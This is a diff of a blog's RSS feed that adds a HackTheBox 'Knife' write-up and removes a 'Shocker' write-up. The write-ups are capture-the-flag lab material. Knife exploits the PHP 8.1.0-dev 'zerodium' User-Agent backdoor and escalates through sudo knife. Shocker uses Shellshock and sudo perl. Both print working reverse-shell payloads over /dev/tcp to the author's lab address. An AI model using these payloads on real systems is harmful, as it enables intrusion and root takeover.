@@ -5,7 +5,129 @@
     <link>https://fahmifj.github.io/tags/sudo/</link>
     <description>Recent content in sudo on Ef&#39;s log</description>
     <generator>Hugo -- gohugo.io</generator>
-    <lastBuildDate>Sat, 07 Aug 2021 21:07:15 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/sudo/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Sat, 28 Aug 2021 22:00:49 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/sudo/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>HackTheBox - Knife</title>
+      <link>https://fahmifj.github.io/writeups/hackthebox/htb-knife/</link>
+      <pubDate>Sat, 28 Aug 2021 22:00:49 +0700</pubDate>
+      
+      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-knife/</guid>
+      <description>Knife hosts a website that is running a hijacked version of PHP in which it contains a remote code execution backdoor. Leveraging this backdoor results in an interactive shell access to the system. For the root part, the user is allowed to run knife binary as root user. The binary can be abused to run a malicious Ruby code.
+Skills Learned  Using a backdoor from a supply chain attack 😅 Exploiting sudo privilege on knife binary.</description>
+      <content:encoded><![CDATA[<p>Knife hosts a website that is running a hijacked version of PHP in which it contains a remote code execution backdoor. Leveraging this backdoor results in an interactive shell access to the system. For the root part, the user is allowed to run  <code>knife</code> binary as root user. The binary can be abused to run a malicious Ruby code.</p>
+<h4 id="skills-learned">Skills Learned</h4>
+<ul>
+<li>Using a backdoor from a supply chain attack 😅</li>
+<li>Exploiting sudo privilege on <code>knife</code> binary.</li>
+</ul>
+<h4 id="tools">Tools</h4>
+<ul>
+<li>Nmap</li>
+<li>BurpSuite</li>
+</ul>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="nmap">Nmap</h3>
+<p>Performing <code>nmap</code> all TCP scan discovers two open ports, SSH on 22 and an Apache web server on 80. Nothing much to see here.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «knife» «10.10.14.117»
+$ fscan 10.10.10.242 knife
+nmap -n -p- --min-rate<span class="o">=</span><span class="m">10000</span> 10.10.10.242 <span class="p">|</span> grep <span class="s1">&#39;^[0-9]&#39;</span> <span class="p">|</span> cut -d <span class="s1">&#39;/&#39;</span> -f1 <span class="p">|</span> tr <span class="s1">&#39;\n&#39;</span> <span class="s1">&#39;,&#39;</span> <span class="p">|</span> sed <span class="s1">&#39;s/,$//&#39;</span>
+nmap -p 22,80 -sC -sV -oA nmap/10-tcp-allport-knife 10.10.10.242
+Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-08-27 10:19 EDT
+Nmap scan report <span class="k">for</span> 10.10.10.242
+Host is up <span class="o">(</span>0.074s latency<span class="o">)</span>.
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+<span class="p">|</span> ssh-hostkey:
+<span class="p">|</span>   <span class="m">3072</span> be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 <span class="o">(</span>RSA<span class="o">)</span>
+<span class="p">|</span>   <span class="m">256</span> bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee <span class="o">(</span>ECDSA<span class="o">)</span>
+<span class="p">|</span>_  <span class="m">256</span> 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
+<span class="p">|</span>_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
+<span class="p">|</span>_http-title:  Emergent Medical Idea
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 26.44 seconds
+</code></pre></div><blockquote>
+<p>fscan is just my Nmap wrapper to do full scan and immediately run script scan against the discovered ports .</p>
+</blockquote>
+<h2 id="enumeration">Enumeration</h2>
+<h3 id="tcp-80----website">TCP 80  - Website</h3>
+<p>With <code>curl</code>, the hosted website shows that it&rsquo;s powered by PHP 8.1.0-dev.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «knife» «10.10.14.70» 
+$ curl -sI http://10.10.10.242/
+HTTP/1.1 <span class="m">200</span> OK
+Date: Sat, <span class="m">22</span> May <span class="m">2021</span> 21:46:13 GMT
+Server: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
+X-Powered-By: PHP/8.1.0-dev
+Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
+</code></pre></div><p>The website only displays some CSS text animation. The available menus aren&rsquo;t clickable.</p>
+<p><div class="img-container"><img src="imgs/image-20210827213646250.png" alt="image-20210827213646250"  /></div>
+</p>
+<p>I did a Gobuster scan but it didn&rsquo;t output any interesting thing.</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="shell-as-james">Shell as james</h3>
+<h4 id="php-rce-backdoor">PHP RCE backdoor</h4>
+<p>Around March 2021, the PHP git server was compromised and two <a href="https://news-web.php.net/php.internals/113838">malicious commit</a> were pushed to the PHP source code. The code from these commits allows an attacker to obtain remote code execution through the HTTP <code>User-Agent</code> header on any website that uses the hijacked version of PHP. In short, it&rsquo;s a backdoor.</p>
+<p>The commits were pushed into the development branch of PHP 8.1. From previous enumeration, the website response with <code>X-Powered-By: PHP/8.1.0-dev</code>. By presuming that the website uses hijacked version of PHP, I can try to send HTTP request with the following HTTP header.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="err">User-Agentt: zerodiumsystem(&#39;uname -a&#39;);
+</span></code></pre></div><p>And the web was vulnerable.</p>
+<p><div class="img-container"><img src="imgs/image-20210827224703632.png" alt="image-20210827224703632"  /></div>
+</p>
+<p>Now to get reverse shell, I can send the following payload:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="err">User-Agentt: zerodiumsystem(&#39;bash -c &#34;bash -i &gt;&amp; /dev/tcp/10.10.14.70/9000 0&gt;&amp;1&#34;&#39;);
+</span></code></pre></div><p>When I send that payload, I have interactive shell access as <strong>james</strong> on my listener.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «knife» «10.10.14.70» 
+$ nc -nvlp <span class="m">9000</span>  
+listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9000</span> ...
+connect to <span class="o">[</span>10.10.14.70<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.242<span class="o">]</span> <span class="m">48566</span>
+bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>966<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
+bash: no job control in this shell
+james@knife:/$ id
+id
+<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>james<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>james<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>james<span class="o">)</span>
+</code></pre></div><p>I also made a script to leverage this backdoor, <a href="https://github.com/fahmifj/php-8.1.0-dev-zerodium-rce">here</a>.</p>
+<h4 id="shell-upgrade">Shell upgrade</h4>
+<p>I will do the PTY trick to upgrade my shell</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">james@knife:/$ <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
+<span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
+james@knife:/$ python3 -c <span class="s1">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+python3 -c <span class="s1">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+james@knife:/$ ^Z
+<span class="o">[</span>1<span class="o">]</span>  + <span class="m">15541</span> suspended  nc -nvlp <span class="m">9000</span>
+→ root@kali «knife» «10.10.14.70» 
+$ stty raw -echo<span class="p">;</span> <span class="nb">fg</span>
+<span class="o">[</span>1<span class="o">]</span>  + <span class="m">15541</span> continued  nc -nvlp <span class="m">9000</span>
+james@knife:/$ 
+</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="shell-as-root">Shell as root</h3>
+<h4 id="enumeration-1">Enumeration</h4>
+<p>User <strong>james</strong> is allowed to run <code>knife</code> as root.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">james@knife:/opt/chef-workstation/bin$ sudo -l
+Matching Defaults entries <span class="k">for</span> james on knife:
+    env_reset, mail_badpass,
+    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+
+User james may run the following commands on knife:
+    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/knife
+</code></pre></div><h4 id="sudo---knife">Sudo - knife</h4>
+<p><code>knife</code> is a part of <a href="https://www.chef.io/products/chef-infra">Chef</a>, a software for infrastructure management and automation. I&rsquo;m not familiar with that, but according to <a href="https://docs.chef.io/workstation/knife_exec/#examples">this documentation</a>, <code>knife</code> can run a Ruby code or Ruby file script. Therefore, the tool can be abused like this.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">james@knife:~$ sudo knife <span class="nb">exec</span> -E <span class="s2">&#34;exec &#39;/bin/bash&#39;&#34;</span>
+root@knife:/home/james# id
+<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+</code></pre></div><p>Now I can grab the root flag</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@knife:/home/james# cat /root/root.txt 
+c3744...<span class="o">[</span>SNIP<span class="o">]</span>...
+</code></pre></div><hr>
+<h2 id="references">Reference(s)</h2>
+<ul>
+<li><a href="https://news-web.php.net/php.internals/113838">https://news-web.php.net/php.internals/113838</a></li>
+<li><a href="https://docs.chef.io/workstation/knife_exec/#examples">https://docs.chef.io/workstation/knife_exec/#examples</a></li>
+</ul>
+]]></content:encoded>
+    </item>
+    
     <item>
       <title>HackTheBox - TheNotebook</title>
       <link>https://fahmifj.github.io/writeups/hackthebox/htb-thenotebook/</link>
@@ -1406,243 +1528,6 @@ ens192: <span class="nv">flags</span><span class="o">=</span>4163&lt;UP,BROADCAS
 <h2 id="references">Reference(s)</h2>
 <ul>
 <li><a href="https://shenaniganslabs.io/2019/02/13/Dirty-Sock.html">https://shenaniganslabs.io/2019/02/13/Dirty-Sock.html</a></li>
-</ul>
-]]></content:encoded>
-    </item>
-    
-    <item>
-      <title>HackTheBox - Shocker</title>
-      <link>https://fahmifj.github.io/writeups/hackthebox/htb-shocker/</link>
-      <pubDate>Tue, 13 Jul 2021 11:30:31 +0700</pubDate>
-      
-      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-shocker/</guid>
-      <description>Hands on with ShellShock vulnerability</description>
-      <content:encoded><![CDATA[<p>Shocker is an easy Linux machines from HackTheBox that introduces a vulnerability called Shellshock (CVE-2014-6271). Exploiting this vulnerability results in an unauthenticated remote code execution, which is leveraged to gain a foothold in the system. There is a sudo privilege on <code>perl</code> , and this can leveraged as well to gain root shell.</p>
-<p>In the end of this write-up, I&rsquo;ll see how the Shellshock vulnerability works.</p>
-<h4 id="skills-learned">Skills Learned</h4>
-<ul>
-<li>Exploitation of Shellshock vulnerability</li>
-<li>Sudo exploitation on perl</li>
-</ul>
-<h4 id="tools">Tools</h4>
-<ul>
-<li>Nmap</li>
-<li>Burp Suite</li>
-<li>Gobuster</li>
-</ul>
-<h2 id="reconnaissance">Reconnaissance</h2>
-<h3 id="nmap">Nmap</h3>
-<p>A full TCP scan discovers two open ports: an Apache web server on port 80 and SSH on port 2222.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «shocker» «10.10.14.83» 
-$ nmap -p- -sV -oA nmap/10-tcp-allport-shocker 10.10.10.56 
-Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-07-10 20:24 EDT
-Nmap scan report <span class="k">for</span> 10.10.10.56
-Host is up <span class="o">(</span>0.065s latency<span class="o">)</span>.
-Not shown: <span class="m">65533</span> closed ports
-PORT     STATE SERVICE VERSION
-80/tcp   open  http    Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
-2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
-Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 98.00 seconds
-</code></pre></div><h2 id="enumeration">Enumeration</h2>
-<h3 id="tcp-80---website">TCP 80 - Website</h3>
-<p>The site serves only one a text and an image.</p>
-<p><div class="img-container"><img src="imgs/image-20210711072532615.png" alt="image-20210711072532615"  /></div>
-</p>
-<p>The server response contains uncommon Header called <code>Accept-Ranges</code>. According to <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Range_requests#requesting_a_specific_range_from_a_server">MDN</a>, this header is allows us to control the portion of the HTTP message.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «shocker» «10.10.14.83» 
-$ curl -I http://10.10.10.56
-HTTP/1.1 <span class="m">200</span> OK
-Date: Sun, <span class="m">11</span> Jul <span class="m">2021</span> 00:49:51 GMT
-Server: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
-Last-Modified: Fri, <span class="m">22</span> Sep <span class="m">2017</span> 20:01:19 GMT
-ETag: <span class="s2">&#34;89-559ccac257884&#34;</span>
-Accept-Ranges: bytes
-Content-Length: <span class="m">137</span>
-Vary: Accept-Encoding
-Content-Type: text/html
-</code></pre></div><p>A <a href="https://www.rapid7.com/db/modules/auxiliary/dos/http/apache_range_dos/">quick search</a> on google finds that it can be used for DDoS attack.</p>
-<h4 id="gobuster">Gobuster</h4>
-<p>A <code>gobuster</code> scan finds two directories:  <code>/cgi-bin/</code> and <code>/icons</code></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «shocker» «10.10.14.83» 
-$ gobuster dir -u http://10.10.10.56/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -o gobuster/gobuster-S-80 -f         
-<span class="o">===============================================================</span>
-Gobuster v3.1.0
-by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
-<span class="o">===============================================================</span>
-<span class="o">[</span>+<span class="o">]</span> Url:                     http://10.10.10.56/
-<span class="o">[</span>+<span class="o">]</span> Method:                  GET
-<span class="o">[</span>+<span class="o">]</span> Threads:                 <span class="m">10</span>
-<span class="o">[</span>+<span class="o">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
-<span class="o">[</span>+<span class="o">]</span> Negative Status codes:   <span class="m">404</span>
-<span class="o">[</span>+<span class="o">]</span> User Agent:              gobuster/3.1.0
-<span class="o">[</span>+<span class="o">]</span> Add Slash:               <span class="nb">true</span>
-<span class="o">[</span>+<span class="o">]</span> Timeout:                 <span class="nv">10s</span>
-<span class="o">===============================================================</span>
-2021/07/10 20:26:07 Starting gobuster in directory enumeration <span class="nv">mode</span>
-<span class="o">===============================================================</span>
-/cgi-bin/             <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 294<span class="o">]</span>
-/icons/               <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 292<span class="o">]</span>
-...<span class="o">[</span>SNIP<span class="o">]</span>...
-</code></pre></div><p>Another scan on <code>/cgi-bin/</code> discovers a file called <code>users.sh</code></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «shocker» «10.10.14.83» 
-$ gobuster dir -u http://10.10.10.56/cgi-bin -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -o gobuster/gobuster-cgi-bin -f -x cgi,sh
-<span class="o">===============================================================</span>
-Gobuster v3.1.0
-by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
-<span class="o">===============================================================</span>
-<span class="o">[</span>+<span class="o">]</span> Url:                     http://10.10.10.56/cgi-bin
-<span class="o">[</span>+<span class="o">]</span> Method:                  GET
-<span class="o">[</span>+<span class="o">]</span> Threads:                 <span class="m">10</span>
-<span class="o">[</span>+<span class="o">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
-<span class="o">[</span>+<span class="o">]</span> Negative Status codes:   <span class="m">404</span>
-<span class="o">[</span>+<span class="o">]</span> User Agent:              gobuster/3.1.0
-<span class="o">[</span>+<span class="o">]</span> Extensions:              cgi,sh
-<span class="o">[</span>+<span class="o">]</span> Add Slash:               <span class="nb">true</span>
-<span class="o">[</span>+<span class="o">]</span> Timeout:                 <span class="nv">10s</span>
-<span class="o">===============================================================</span>
-2021/07/10 21:43:04 Starting gobuster in directory enumeration <span class="nv">mode</span>
-<span class="o">===============================================================</span>
-/user.sh              <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 125<span class="o">]</span>
-...<span class="o">[</span>SNIP<span class="o">]</span>...
-</code></pre></div><p>The <code>script.sh</code> returns the following contents.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «shocker» «10.10.14.83» 
-$ curl -s http://10.10.10.56/cgi-bin/user.sh
-Content-Type: text/plain
-
-Just an uptime <span class="nb">test</span> script
-
- 21:46:09 up <span class="m">1</span> day, 20:28,  <span class="m">0</span> users,  load average: 0.00, 0.01, 0.00
-</code></pre></div><p>According to the box name and a <code>/cgi-bin/</code> folder which contains a bash script, it&rsquo;s going to be shellshock vulnerability.</p>
-<h2 id="foothold">Foothold</h2>
-<h3 id="shell-as-shelly">Shell as shelly</h3>
-<h4 id="shellshock-cve-2014-6271">Shellshock (CVE-2014-6271)</h4>
-<p>The Shellshock vulnerability is well explained in this <a href="https://pentesterlab.com/exercises/cve-2014-6271/course">free course</a> by PentesterLab.</p>
-<p>The following is the commonly used PoC for shellshock.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="o">(){</span>:<span class="o">}</span><span class="p">;</span> echo<span class="p">;</span> &lt;bash command&gt;
-</code></pre></div><p>The PoC works on <code>User-Agent</code> header.</p>
-<p><div class="img-container"><img src="imgs/image-20210711090447537-1626151933213.png" alt="image-20210711090447537"  /></div>
-</p>
-<p>It also works on the  <code>Accept</code> header (I&rsquo;m shocked now 😄).</p>
-<p><div class="img-container"><img src="imgs/image-20210711085942731.png" alt="image-20210711085942731"  /></div>
-</p>
-<h4 id="reverse-shell">Reverse Shell</h4>
-<p>I tried to get a shell but somehow it didn&rsquo;t connect back, but then I figured out why after redirecting stderr to stderr, it wanted a full path!</p>
-<p><div class="img-container"><img src="imgs/image-20210711091930431.png" alt="image-20210711091930431"  /></div>
-</p>
-<p>The installed <code>nc</code> doesn&rsquo;t have <code>-e</code>.</p>
-<p><div class="img-container"><img src="imgs/image-20210711092401328.png" alt="image-20210711092401328"  /></div>
-</p>
-<p>The following bash reverse shell works.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">()</span> <span class="o">{</span> :<span class="p">;</span><span class="o">}</span><span class="p">;</span> echo<span class="p">;</span> <span class="nb">echo</span> <span class="s2">&#34;/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.83/53 0&gt;&amp;1&#34;</span> <span class="p">|</span> /bin/bash
-</code></pre></div><p><div class="img-container"><img src="imgs/image-20210711093314357.png" alt="image-20210711093314357"  /></div>
-</p>
-<h4 id="shell-upgrade">Shell Upgrade</h4>
-<p>I&rsquo;ll upgrade my shell using the PTY trick (that&rsquo;s how I called it).</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">shelly@Shocker:/usr/lib/cgi-bin$ <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
-<span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
-shelly@Shocker:/usr/lib/cgi-bin$ script /dev/null -c bash                    
-script /dev/null -c bash
-Script started, file is /dev/null
-shelly@Shocker:/usr/lib/cgi-bin$ ^Z
-<span class="o">[</span>1<span class="o">]</span>  + <span class="m">7339</span> suspended  nc -nvlp <span class="m">53</span>
-→ kali@kali «shocker» «10.10.14.83» 
-$ stty raw -echo<span class="p">;</span> <span class="nb">fg</span>
-<span class="o">[</span>1<span class="o">]</span>  + <span class="m">7339</span> continued  nc -nvlp <span class="m">53</span>
-
-shelly@Shocker:/usr/lib/cgi-bin$  
-</code></pre></div><p>The user flag is done here.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">shelly@Shocker:/home/shelly$ ls -l 
-total <span class="m">8</span>
-drwxr-xr-x <span class="m">2</span> shelly shelly <span class="m">4096</span> Jul <span class="m">10</span> 03:31 <span class="nb">test</span>
--r--r--r-- <span class="m">1</span> root   root     <span class="m">33</span> Jul  <span class="m">9</span> 01:17 user.txt
-shelly@Shocker:/home/shelly$ cat user.txt 
-7ac9eb73e6cb...<span class="o">[</span>SNIP<span class="o">]</span>...
-</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
-<h3 id="shell-as-root">Shell as root</h3>
-<h4 id="internal-enumeration">Internal Enumeration</h4>
-<p>A quick check on sudo privileges reveals that user <code>shelly</code> can run <code>perl</code> with <code>sudo</code>.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">shelly@Shocker:/usr/lib/cgi-bin$ sudo -l
-sudo -l
-Matching Defaults entries <span class="k">for</span> shelly on Shocker:
-    env_reset, mail_badpass,
-    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
-
-User shelly may run the following commands on Shocker:
-    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/perl
-</code></pre></div><h4 id="sudo---perl">Sudo - perl</h4>
-<p>Using <a href="https://gtfobins.github.io/gtfobins/perl/#sudo">GTFOBins</a> as reference, I&rsquo;m now root.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">shelly@Shocker:/home/shelly$ sudo -u root perl -e <span class="s1">&#39;exec &#34;/bin/bash&#34;;&#39;</span>
-root@Shocker:/home/shelly# id <span class="o">&amp;&amp;</span> hostname
-<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
-Shocker
-root@Shocker:/home/shelly#
-</code></pre></div><p>The root flag.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@Shocker:~# cat root.txt
-e3689b13acb2...<span class="o">[</span>SNIP<span class="o">]</span>...
-</code></pre></div><h2 id="extras">Extras</h2>
-<p>Since this vulnerability is interesting yet dangerous, I&rsquo;d like to observe it a little more.</p>
-<h3 id="playing-a-bit-with-shellshock">Playing a bit with Shellshock</h3>
-<p>I did a quick test using the following script which placed under /<code>cgi-bin/</code> folder. The script will prints all the environment variables.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@Shocker:/usr/lib/cgi-bin# <span class="nb">echo</span> -e <span class="s1">&#39;#!/bin/bash\necho test\nenv&#39;</span> &gt; iamf.sh
-root@Shocker:/usr/lib/cgi-bin# chmod +x iamf.sh 
-</code></pre></div><p>And now I could understand why it is so dangerous. It even exports my custom header and turns it into an environment variable.</p>
-<p><div class="img-container"><img src="imgs/image-20210711100705447.png" alt="image-20210711100705447"  /></div>
-</p>
-<p>The full response</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">HTTP/1.1 200 OK
-Date: Sun, 11 Jul 2021 03:06:31 GMT
-Server: Apache/2.4.18 (Ubuntu)
-Connection: close
-Content-Type: text/x-sh
-Content-Length: 1113
-
-iamf
-test
-SERVER_SIGNATURE=&lt;address&gt;Apache/2.4.18 (Ubuntu) Server at 10.10.10.56 Port 80&lt;/address&gt;
-
-HTTP_USER_AGENT=Blackhole
-SERVER_PORT=80
-HTTP_HOST=10.10.10.56
-DOCUMENT_ROOT=/var/www/html
-SCRIPT_FILENAME=/usr/lib/cgi-bin/iamf.sh
-REQUEST_URI=/cgi-bin/iamf.sh
-SCRIPT_NAME=/cgi-bin/iamf.sh
-HTTP_CONNECTION=close
-REMOTE_PORT=58222
-PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
-HTTP_IF_NONE_MATCH=&#34;89-559ccac257884-gzip&#34;
-CONTEXT_PREFIX=/cgi-bin/
-PWD=/usr/lib/cgi-bin
-SERVER_ADMIN=webmaster@localhost
-REQUEST_SCHEME=http
-HTTP_IF_MODIFIED_SINCE=Fri, 22 Sep 2017 20:01:19 GMT
-HTTP_ACCEPT_LANGUAGE=en-US,en;q=0.5
-HTTP_ACCEPT=text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
-REMOTE_ADDR=10.10.14.83
-SHLVL=1
-SERVER_NAME=10.10.10.56
-CONTENT_LENGTH=0
-SERVER_SOFTWARE=Apache/2.4.18 (Ubuntu)
-QUERY_STRING=
-SERVER_ADDR=10.10.10.56
-GATEWAY_INTERFACE=CGI/1.1
-HTTP_UPGRADE_INSECURE_REQUESTS=1
-SERVER_PROTOCOL=HTTP/1.1
-HTTP_CACHE_CONTROL=max-age=0
-HTTP_ACCEPT_ENCODING=gzip, deflate
-REQUEST_METHOD=GET
-CONTEXT_DOCUMENT_ROOT=/usr/lib/cgi-bin/
-HTTP_IAMF_HEADER=() {  :
-}
-_=/usr/bin/env
-</code></pre></div><hr>
-<h2 id="references">Reference(s)</h2>
-<ul>
-<li><a href="https://pentesterlab.com/exercises/cve-2014-6271/course">https://pentesterlab.com/exercises/cve-2014-6271/course</a></li>
-<li><a href="https://gtfobins.github.io/gtfobins/perl/#sudo">https://gtfobins.github.io/gtfobins/perl/#sudo</a></li>
 </ul>
 ]]></content:encoded>
     </item>
